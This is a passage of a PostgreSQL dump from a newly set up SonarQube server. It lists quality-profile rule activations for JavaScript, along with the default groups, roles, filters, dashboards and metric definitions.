410	2017-11-23 16:16:52.798	\N	key=js-sonar-way-48125:javascript:S1697;ruleKey=javascript:S1697;profileKey=js-sonar-way-48125;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pqug-zJFC7L4qK5ff
411	2017-11-23 16:16:52.801	\N	key=js-sonar-way-48125:javascript:OctalNumber;ruleKey=javascript:OctalNumber;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquhBzJFC7L4qK5fg
412	2017-11-23 16:16:52.805	\N	key=js-sonar-way-48125:javascript:OneStatementPerLine;ruleKey=javascript:OneStatementPerLine;profileKey=js-sonar-way-48125;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquhFzJFC7L4qK5fh
413	2017-11-23 16:16:52.808	\N	key=js-sonar-way-48125:javascript:PrimitiveWrappers;ruleKey=javascript:PrimitiveWrappers;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquhIzJFC7L4qK5fi
414	2017-11-23 16:16:52.811	\N	key=js-sonar-way-48125:javascript:S2814;ruleKey=javascript:S2814;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquhLzJFC7L4qK5fj
415	2017-11-23 16:16:52.814	\N	key=js-sonar-way-48125:javascript:S2432;ruleKey=javascript:S2432;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquhOzJFC7L4qK5fk
416	2017-11-23 16:16:52.817	\N	key=js-sonar-way-48125:javascript:S1126;ruleKey=javascript:S1126;profileKey=js-sonar-way-48125;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquhRzJFC7L4qK5fl
417	2017-11-23 16:16:52.82	\N	key=js-sonar-way-48125:javascript:S1656;ruleKey=javascript:S1656;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquhUzJFC7L4qK5fm
418	2017-11-23 16:16:52.823	\N	key=js-sonar-way-48125:javascript:S3499;ruleKey=javascript:S3499;profileKey=js-sonar-way-48125;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquhXzJFC7L4qK5fn
419	2017-11-23 16:16:52.826	\N	key=js-sonar-way-48125:javascript:StrictMode;ruleKey=javascript:StrictMode;profileKey=js-sonar-way-48125;severity=INFO	QPROFILE	ACTIVATED	\N	AV_pquhazJFC7L4qK5fo
420	2017-11-23 16:16:52.83	\N	key=js-sonar-way-48125:javascript:S3402;ruleKey=javascript:S3402;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquhezJFC7L4qK5fp
421	2017-11-23 16:16:52.833	\N	key=js-sonar-way-48125:javascript:S3003;ruleKey=javascript:S3003;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquhhzJFC7L4qK5fq
422	2017-11-23 16:16:52.836	\N	key=js-sonar-way-48125:javascript:S1301;ruleKey=javascript:S1301;profileKey=js-sonar-way-48125;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquhkzJFC7L4qK5fr
423	2017-11-23 16:16:52.84	\N	key=js-sonar-way-48125:javascript:SwitchWithoutDefault;ruleKey=javascript:SwitchWithoutDefault;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquhozJFC7L4qK5fs
424	2017-11-23 16:16:52.843	\N	key=js-sonar-way-48125:javascript:S1135;ruleKey=javascript:S1135;profileKey=js-sonar-way-48125;severity=INFO	QPROFILE	ACTIVATED	\N	AV_pquhrzJFC7L4qK5ft
425	2017-11-23 16:16:52.846	\N	key=js-sonar-way-48125:javascript:S930;ruleKey=javascript:S930;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquhuzJFC7L4qK5fu
426	2017-11-23 16:16:52.849	\N	key=js-sonar-way-48125:javascript:TooManyBreakOrContinueInLoop;ruleKey=javascript:TooManyBreakOrContinueInLoop;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquhxzJFC7L4qK5fv
427	2017-11-23 16:16:52.852	\N	key=js-sonar-way-48125:javascript:S104;ruleKey=javascript:S104;profileKey=js-sonar-way-48125;param_maximum=1000;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquh0zJFC7L4qK5fw
428	2017-11-23 16:16:52.855	\N	key=js-sonar-way-48125:javascript:S138;ruleKey=javascript:S138;profileKey=js-sonar-way-48125;param_max=100;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquh3zJFC7L4qK5fx
429	2017-11-23 16:16:52.86	\N	key=js-sonar-way-48125:javascript:S3002;ruleKey=javascript:S3002;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquh8zJFC7L4qK5fy
430	2017-11-23 16:16:52.863	\N	key=js-sonar-way-48125:javascript:S3353;ruleKey=javascript:S3353;profileKey=js-sonar-way-48125;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquh_zJFC7L4qK5fz
431	2017-11-23 16:16:52.867	\N	key=js-sonar-way-48125:javascript:S2137;ruleKey=javascript:S2137;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquiDzJFC7L4qK5f0
432	2017-11-23 16:16:52.871	\N	key=js-sonar-way-48125:javascript:UnreachableCode;ruleKey=javascript:UnreachableCode;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquiHzJFC7L4qK5f1
433	2017-11-23 16:16:52.876	\N	key=js-sonar-way-48125:javascript:UnusedFunctionArgument;ruleKey=javascript:UnusedFunctionArgument;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquiLzJFC7L4qK5f2
434	2017-11-23 16:16:52.88	\N	key=js-sonar-way-48125:javascript:UnusedVariable;ruleKey=javascript:UnusedVariable;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquiQzJFC7L4qK5f3
435	2017-11-23 16:16:52.884	\N	key=js-sonar-way-48125:javascript:S3500;ruleKey=javascript:S3500;profileKey=js-sonar-way-48125;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquiUzJFC7L4qK5f4
436	2017-11-23 16:16:52.888	\N	key=js-sonar-way-48125:javascript:S905;ruleKey=javascript:S905;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquiXzJFC7L4qK5f5
437	2017-11-23 16:16:52.891	\N	key=js-sonar-way-48125:javascript:S2123;ruleKey=javascript:S2123;profileKey=js-sonar-way-48125;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquibzJFC7L4qK5f6
438	2017-11-23 16:16:52.895	\N	key=js-sonar-way-48125:javascript:S1154;ruleKey=javascript:S1154;profileKey=js-sonar-way-48125;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquifzJFC7L4qK5f7
439	2017-11-23 16:16:52.899	\N	key=js-sonar-way-48125:javascript:VariableDeclarationAfterUsage;ruleKey=javascript:VariableDeclarationAfterUsage;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquijzJFC7L4qK5f8
440	2017-11-23 16:16:52.902	\N	key=js-sonar-way-48125:javascript:S2703;ruleKey=javascript:S2703;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquimzJFC7L4qK5f9
441	2017-11-23 16:16:52.905	\N	key=js-sonar-way-48125:javascript:WithStatement;ruleKey=javascript:WithStatement;profileKey=js-sonar-way-48125;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquipzJFC7L4qK5f-
443	2017-11-23 16:16:52.943	\N	key=js-sonar-security-way-66631:javascript:ArrayAndObjectConstructors;ruleKey=javascript:ArrayAndObjectConstructors;profileKey=js-sonar-security-way-66631;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqujPzJFC7L4qK5gA
444	2017-11-23 16:16:52.953	\N	key=js-sonar-security-way-66631:javascript:AssignmentWithinCondition;ruleKey=javascript:AssignmentWithinCondition;profileKey=js-sonar-security-way-66631;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqujZzJFC7L4qK5gB
445	2017-11-23 16:16:52.965	\N	key=js-sonar-security-way-66631:javascript:BoundOrAssignedEvalOrArguments;ruleKey=javascript:BoundOrAssignedEvalOrArguments;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqujlzJFC7L4qK5gC
446	2017-11-23 16:16:52.977	\N	key=js-sonar-security-way-66631:javascript:S2688;ruleKey=javascript:S2688;profileKey=js-sonar-security-way-66631;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pqujxzJFC7L4qK5gD
447	2017-11-23 16:16:52.985	\N	key=js-sonar-security-way-66631:javascript:S2228;ruleKey=javascript:S2228;profileKey=js-sonar-security-way-66631;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquj5zJFC7L4qK5gE
448	2017-11-23 16:16:52.995	\N	key=js-sonar-security-way-66631:javascript:S1854;ruleKey=javascript:S1854;profileKey=js-sonar-security-way-66631;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqukDzJFC7L4qK5gF
449	2017-11-23 16:16:53.004	\N	key=js-sonar-security-way-66631:javascript:DebuggerStatement;ruleKey=javascript:DebuggerStatement;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqukLzJFC7L4qK5gG
450	2017-11-23 16:16:53.013	\N	key=js-sonar-security-way-66631:javascript:S1788;ruleKey=javascript:S1788;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqukVzJFC7L4qK5gH
451	2017-11-23 16:16:53.021	\N	key=js-sonar-security-way-66631:javascript:S2870;ruleKey=javascript:S2870;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqukdzJFC7L4qK5gI
452	2017-11-23 16:16:53.026	\N	key=js-sonar-security-way-66631:javascript:S3001;ruleKey=javascript:S3001;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqukizJFC7L4qK5gJ
453	2017-11-23 16:16:53.029	\N	key=js-sonar-security-way-66631:javascript:S3403;ruleKey=javascript:S3403;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquklzJFC7L4qK5gK
454	2017-11-23 16:16:53.032	\N	key=js-sonar-security-way-66631:javascript:S1871;ruleKey=javascript:S1871;profileKey=js-sonar-security-way-66631;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqukozJFC7L4qK5gL
455	2017-11-23 16:16:53.035	\N	key=js-sonar-security-way-66631:javascript:S1862;ruleKey=javascript:S1862;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqukrzJFC7L4qK5gM
456	2017-11-23 16:16:53.039	\N	key=js-sonar-security-way-66631:javascript:DuplicateFunctionArgument;ruleKey=javascript:DuplicateFunctionArgument;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqukuzJFC7L4qK5gN
457	2017-11-23 16:16:53.042	\N	key=js-sonar-security-way-66631:javascript:DuplicatePropertyName;ruleKey=javascript:DuplicatePropertyName;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqukxzJFC7L4qK5gO
458	2017-11-23 16:16:53.044	\N	key=js-sonar-security-way-66631:javascript:EmptyBlock;ruleKey=javascript:EmptyBlock;profileKey=js-sonar-security-way-66631;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquk0zJFC7L4qK5gP
459	2017-11-23 16:16:53.047	\N	key=js-sonar-security-way-66631:javascript:Eval;ruleKey=javascript:Eval;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquk3zJFC7L4qK5gQ
460	2017-11-23 16:16:53.05	\N	key=js-sonar-security-way-66631:javascript:ForIn;ruleKey=javascript:ForIn;profileKey=js-sonar-security-way-66631;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquk6zJFC7L4qK5gR
461	2017-11-23 16:16:53.054	\N	key=js-sonar-security-way-66631:javascript:S1994;ruleKey=javascript:S1994;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquk-zJFC7L4qK5gS
462	2017-11-23 16:16:53.059	\N	key=js-sonar-security-way-66631:javascript:S2251;ruleKey=javascript:S2251;profileKey=js-sonar-security-way-66631;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pqulDzJFC7L4qK5gT
463	2017-11-23 16:16:53.063	\N	key=js-sonar-security-way-66631:javascript:FunctionDefinitionInsideLoop;ruleKey=javascript:FunctionDefinitionInsideLoop;profileKey=js-sonar-security-way-66631;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqulHzJFC7L4qK5gU
464	2017-11-23 16:16:53.067	\N	key=js-sonar-security-way-66631:javascript:S2990;ruleKey=javascript:S2990;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqulLzJFC7L4qK5gV
465	2017-11-23 16:16:53.071	\N	key=js-sonar-security-way-66631:javascript:HtmlComments;ruleKey=javascript:HtmlComments;profileKey=js-sonar-security-way-66631;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqulPzJFC7L4qK5gW
466	2017-11-23 16:16:53.075	\N	key=js-sonar-security-way-66631:javascript:S1764;ruleKey=javascript:S1764;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqulTzJFC7L4qK5gX
467	2017-11-23 16:16:53.079	\N	key=js-sonar-security-way-66631:javascript:S3271;ruleKey=javascript:S3271;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqulXzJFC7L4qK5gY
468	2017-11-23 16:16:53.084	\N	key=js-sonar-security-way-66631:javascript:S2234;ruleKey=javascript:S2234;profileKey=js-sonar-security-way-66631;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pqulczJFC7L4qK5gZ
469	2017-11-23 16:16:53.088	\N	key=js-sonar-security-way-66631:javascript:S2681;ruleKey=javascript:S2681;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqulgzJFC7L4qK5ga
470	2017-11-23 16:16:53.092	\N	key=js-sonar-security-way-66631:javascript:S2999;ruleKey=javascript:S2999;profileKey=js-sonar-security-way-66631;param_considerJSDoc=false;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqulkzJFC7L4qK5gb
471	2017-11-23 16:16:53.096	\N	key=js-sonar-security-way-66631:javascript:S1697;ruleKey=javascript:S1697;profileKey=js-sonar-security-way-66631;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pqulozJFC7L4qK5gc
472	2017-11-23 16:16:53.1	\N	key=js-sonar-security-way-66631:javascript:S2814;ruleKey=javascript:S2814;profileKey=js-sonar-security-way-66631;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqulszJFC7L4qK5gd
473	2017-11-23 16:16:53.104	\N	key=js-sonar-security-way-66631:javascript:S2432;ruleKey=javascript:S2432;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqulwzJFC7L4qK5ge
474	2017-11-23 16:16:53.108	\N	key=js-sonar-security-way-66631:javascript:S1656;ruleKey=javascript:S1656;profileKey=js-sonar-security-way-66631;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqul0zJFC7L4qK5gf
475	2017-11-23 16:16:53.112	\N	key=js-sonar-security-way-66631:javascript:TrailingComma;ruleKey=javascript:TrailingComma;profileKey=js-sonar-security-way-66631;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pqul4zJFC7L4qK5gg
476	2017-11-23 16:16:53.115	\N	key=js-sonar-security-way-66631:javascript:S3002;ruleKey=javascript:S3002;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqul7zJFC7L4qK5gh
477	2017-11-23 16:16:53.119	\N	key=js-sonar-security-way-66631:javascript:S3500;ruleKey=javascript:S3500;profileKey=js-sonar-security-way-66631;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pqul_zJFC7L4qK5gi
478	2017-11-23 16:16:53.123	\N	key=js-sonar-security-way-66631:javascript:S905;ruleKey=javascript:S905;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqumDzJFC7L4qK5gj
479	2017-11-23 16:16:53.127	\N	key=js-sonar-security-way-66631:javascript:S2123;ruleKey=javascript:S2123;profileKey=js-sonar-security-way-66631;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pqumHzJFC7L4qK5gk
480	2017-11-23 16:16:53.13	\N	key=js-sonar-security-way-66631:javascript:S1154;ruleKey=javascript:S1154;profileKey=js-sonar-security-way-66631;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pqumKzJFC7L4qK5gl
481	2017-11-23 16:16:53.134	\N	key=js-sonar-security-way-66631:javascript:WithStatement;ruleKey=javascript:WithStatement;profileKey=js-sonar-security-way-66631;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pqumOzJFC7L4qK5gm
\.


--
-- TOC entry 2671 (class 0 OID 33237)
-- Dependencies: 237
-- Data for Name: authors; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY authors (id, person_id, login, created_at, updated_at) FROM stdin;
\.


--
-- TOC entry 2702 (class 0 OID 33534)
-- Dependencies: 268
-- Data for Name: ce_activity; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY ce_activity (id, uuid, task_type, component_uuid, status, is_last, is_last_key, submitter_login, submitted_at, started_at, executed_at, created_at, updated_at, execution_time_ms, snapshot_id) FROM stdin;
\.


--
-- TOC entry 2704 (class 0 OID 33544)
-- Dependencies: 270
-- Data for Name: ce_queue; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY ce_queue (id, uuid, task_type, component_uuid, status, submitter_login, started_at, created_at, updated_at) FROM stdin;
\.


--
-- TOC entry 2656 (class 0 OID 33066)
-- Dependencies: 222
-- Data for Name: dashboards; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY dashboards (id, user_id, name, description, column_layout, shared, created_at, updated_at, is_global) FROM stdin;
1	\N	Custom	\N	50%-50%	t	2017-11-23 16:16:53.576	2017-11-23 16:16:53.576	f
2	\N	Home	\N	30%-70%	t	2017-11-23 16:16:53.607	2017-11-23 16:16:53.607	t
\.


--
-- TOC entry 2665 (class 0 OID 33160)
-- Dependencies: 231
-- Data for Name: duplications_index; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY duplications_index (project_snapshot_id, snapshot_id, hash, index_in_file, start_line, end_line, id) FROM stdin;
\.


--
-- TOC entry 2643 (class 0 OID 32913)
-- Dependencies: 209
-- Data for Name: events; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY events (id, name, snapshot_id, category, description, event_data, event_date, created_at, component_uuid) FROM stdin;
\.


--
-- TOC entry 2698 (class 0 OID 33499)
-- Dependencies: 264
-- Data for Name: file_sources; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY file_sources (id, project_uuid, file_uuid, line_hashes, data_hash, created_at, updated_at, src_hash, binary_data, data_type, revision) FROM stdin;
\.


--
-- TOC entry 2650 (class 0 OID 32965)
-- Dependencies: 216
-- Data for Name: group_roles; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY group_roles (id, group_id, resource_id, role) FROM stdin;
1	1	\N	admin
2	1	\N	profileadmin
3	1	\N	shareDashboard
4	\N	\N	scan
6	\N	\N	provisioning
7	1	\N	provisioning
8	1	\N	gateadmin
9	1	1	admin
10	1	1	issueadmin
11	\N	1	user
12	\N	1	codeviewer
\.


--
-- TOC entry 2647 (class 0 OID 32952)
-- Dependencies: 213
-- Data for Name: groups; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY groups (id, name, description, created_at, updated_at) FROM stdin;
1	sonar-administrators	System administrators	2017-11-23 16:16:27.825	2017-11-23 16:16:27.825
2	sonar-users	Any new users created will automatically join this group	2017-11-23 16:16:27.993	2017-11-23 16:16:27.993
\.


--
-- TOC entry 2648 (class 0 OID 32958)
-- Dependencies: 214
-- Data for Name: groups_users; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY groups_users (user_id, group_id) FROM stdin;
1	1
1	2
\.


--
-- TOC entry 2680 (class 0 OID 33331)
-- Dependencies: 246
-- Data for Name: issue_changes; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY issue_changes (id, kee, issue_key, user_login, change_type, change_data, created_at, updated_at, issue_change_creation_date) FROM stdin;
\.


--
-- TOC entry 2684 (class 0 OID 33369)
-- Dependencies: 250
-- Data for Name: issue_filter_favourites; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY issue_filter_favourites (id, user_login, issue_filter_id, created_at) FROM stdin;
\.


--
-- TOC entry 2682 (class 0 OID 33356)
-- Dependencies: 248
-- Data for Name: issue_filters; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY issue_filters (id, name, user_login, shared, description, data, created_at, updated_at) FROM stdin;
1	Unresolved Issues	\N	t	\N	resolved=false	2017-11-23 16:16:53.547	2017-11-23 16:16:53.547
2	False Positive and Won't Fix Issues	\N	t	\N	resolutions=FALSE-POSITIVE,WONTFIX	2017-11-23 16:16:53.547	2017-11-23 16:16:53.547
3	My Unresolved Issues	\N	t	\N	resolved=false|assignees=__me__	2017-11-23 16:16:53.547	2017-11-23 16:16:53.547
\.


--
-- TOC entry 2678 (class 0 OID 33320)
-- Dependencies: 244
-- Data for Name: issues; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY issues (id, kee, rule_id, severity, manual_severity, message, line, gap, status, resolution, checksum, reporter, assignee, author_login, action_plan_key, issue_attributes, effort, created_at, updated_at, issue_creation_date, issue_update_date, issue_close_date, tags, component_uuid, project_uuid, locations, issue_type) FROM stdin;
\.


--
-- TOC entry 2667 (class 0 OID 33172)
-- Dependencies: 233
-- Data for Name: loaded_templates; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY loaded_templates (id, kee, template_type) FROM stdin;
1	SonarQube way	QUALITY_GATE
2	cs:Sonar way	QUALITY_PROFILE
3	java:Sonar way	QUALITY_PROFILE
4	js:Sonar way	QUALITY_PROFILE
5	js:Sonar Security Way	QUALITY_PROFILE
6	Projects	FILTER
7	My favourites	FILTER
8	Unresolved Issues	ISSUE_FILTER
9	False Positive and Won't Fix Issues	ISSUE_FILTER
10	My Unresolved Issues	ISSUE_FILTER
11	Custom	DASHBOARD
12	Home	DASHBOARD
13	default_template	PERM_TEMPLATE
14	RenameIssueWidgets	ONE_SHOT_TASK
15	DisplayLogOnDeprecatedProjects	ONE_SHOT_TASK
16	ClearRulesOverloadedDebt	ONE_SHOT_TASK
17	UpdateUsersLocal	ONE_SHOT_TASK
\.


--
-- TOC entry 2662 (class 0 OID 33127)
-- Dependencies: 228
-- Data for Name: manual_measures; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY manual_measures (id, metric_id, value, text_value, user_login, description, created_at, updated_at, component_uuid) FROM stdin;
\.


--
-- TOC entry 2675 (class 0 OID 33275)
-- Dependencies: 241
-- Data for Name: measure_filter_favourites; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY measure_filter_favourites (id, user_id, measure_filter_id, created_at) FROM stdin;
\.


--
-- TOC entry 2673 (class 0 OID 33262)
-- Dependencies: 239
-- Data for Name: measure_filters; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY measure_filters (id, name, user_id, shared, description, data, created_at, updated_at) FROM stdin;
1	Projects	\N	t	\N	display=list|qualifiers=TRK|cols=metric:alert_status,name,version,metric:ncloc,metric:bugs,metric:vulnerabilities,metric:code_smells,date	2017-11-23 16:16:53.52	2017-11-23 16:16:53.52
2	My favourites	\N	t	\N	display=list|onFavourites=true|cols=metric:alert_status,name,date	2017-11-23 16:16:53.532	2017-11-23 16:16:53.532
\.


--
-- TOC entry 2625 (class 0 OID 32796)
-- Dependencies: 191
-- Data for Name: metrics; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) FROM stdin;
1	lines	Lines	-1	Size	Lines	f	INT	f	t	\N	\N	f	f	f	\N
2	generated_lines	Number of generated lines	-1	Size	Generated Lines	f	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
3	ncloc	Non Commenting Lines of Code	-1	Size	Lines of Code	f	INT	f	t	\N	\N	f	f	f	\N
4	ncloc_language_distribution	Non Commenting Lines of Code Distributed By Language	-1	Size	Lines of Code Per Language	f	DATA	f	t	\N	\N	f	f	f	\N
5	generated_ncloc	Generated non Commenting Lines of Code	-1	Size	Generated Lines of Code	f	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
6	classes	Classes	-1	Size	Classes	f	INT	f	t	\N	\N	f	f	f	\N
7	files	Number of files	-1	Size	Files	f	INT	f	t	\N	\N	f	f	f	\N
8	directories	Directories	-1	Size	Directories	f	INT	f	t	\N	\N	f	f	f	\N
9	packages	Packages	-1	Size	Packages	f	INT	f	t	\N	\N	f	t	f	\N
10	functions	Functions	-1	Size	Functions	f	INT	f	t	\N	\N	f	f	f	\N
11	accessors	Accessors	-1	Size	Accessors	f	INT	f	t	\N	\N	f	t	f	\N
12	statements	Number of statements	-1	Size	Statements	f	INT	f	t	\N	\N	f	f	f	\N
13	public_api	Public API	-1	Documentation	Public API	f	INT	f	t	\N	\N	f	f	f	\N
14	projects	Number of projects	-1	Size	Projects	f	INT	f	t	\N	\N	f	f	f	\N
15	comment_lines	Number of comment lines	1	Documentation	Comment Lines	f	INT	f	t	\N	\N	f	f	f	\N
16	comment_lines_density	Comments balanced by ncloc + comment lines	1	Documentation	Comments (%)	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	f	1
17	public_documented_api_density	Public documented classes and functions balanced by ncloc	1	Documentation	Public Documented API (%)	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	t	f	f	1
18	public_undocumented_api	Public undocumented classes, functions and variables	-1	Documentation	Public Undocumented API	t	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
19	commented_out_code_lines	Commented lines of code	-1	Documentation	Commented-Out LOC	t	INT	f	t	\N	0.00000000000000000000	t	t	f	\N
20	complexity	Cyclomatic complexity	-1	Complexity	Complexity	f	INT	f	t	\N	\N	f	f	f	\N
21	file_complexity	Complexity average by file	-1	Complexity	Complexity / File	t	FLOAT	f	t	\N	\N	f	f	f	1
22	complexity_in_classes	Cyclomatic complexity in classes	-1	Complexity	Complexity in Classes	f	INT	f	t	\N	\N	f	t	t	\N
23	class_complexity	Complexity average by class	-1	Complexity	Complexity / Class	t	FLOAT	f	t	\N	\N	f	f	f	1
24	complexity_in_functions	Cyclomatic complexity in functions	-1	Complexity	Complexity in Functions	f	INT	f	t	\N	\N	f	t	t	\N
25	function_complexity	Complexity average by function	-1	Complexity	Complexity / Function	t	FLOAT	f	t	\N	\N	f	f	f	1
26	class_complexity_distribution	Classes distribution /complexity	0	Complexity	Class Distribution / Complexity	t	DISTRIB	f	t	\N	\N	f	t	f	\N
27	function_complexity_distribution	Functions distribution /complexity	0	Complexity	Function Distribution / Complexity	t	DISTRIB	f	t	\N	\N	f	f	f	\N
28	file_complexity_distribution	Files distribution /complexity	0	Complexity	File Distribution / Complexity	t	DISTRIB	f	t	\N	\N	f	f	f	\N
29	tests	Number of unit tests	-1	Coverage	Unit Tests	f	INT	f	t	\N	\N	f	f	f	\N
30	test_execution_time	Execution duration of unit tests	-1	Coverage	Unit Test Duration	f	MILLISEC	f	t	\N	\N	f	f	f	\N
31	test_errors	Number of unit test errors	-1	Coverage	Unit Test Errors	t	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
32	skipped_tests	Number of skipped unit tests	-1	Coverage	Skipped Unit Tests	t	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
33	test_failures	Number of unit test failures	-1	Coverage	Unit Test Failures	t	INT	f	t	\N	0.00000000000000000000	t	f	f	\N
34	test_success_density	Density of successful unit tests	1	Coverage	Unit Test Success (%)	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	t	f	f	1
35	test_data	Unit tests details	-1	Coverage	Unit Test Details	f	DATA	f	t	\N	\N	f	f	f	\N
36	coverage	Coverage by unit tests	1	Coverage	Coverage	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	f	1
37	new_coverage	Coverage of new/changed code	1	Coverage	Coverage on New Code	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	t	1
38	lines_to_cover	Lines to cover	1	Coverage	Lines to Cover	f	INT	f	t	\N	\N	f	f	f	\N
39	new_lines_to_cover	Lines to cover on new code	-1	Coverage	Lines to Cover on New Code	f	INT	f	t	\N	\N	f	f	t	\N
40	uncovered_lines	Uncovered lines	-1	Coverage	Uncovered Lines	f	INT	f	t	\N	0.00000000000000000000	f	f	f	\N
41	new_uncovered_lines	Uncovered lines on new code	-1	Coverage	Uncovered Lines on New Code	f	INT	f	t	\N	0.00000000000000000000	f	f	t	\N
42	line_coverage	Line coverage	1	Coverage	Line Coverage	t	PERCENT	f	t	0.00000000000000000000	100.00000000000000000000	f	f	f	1
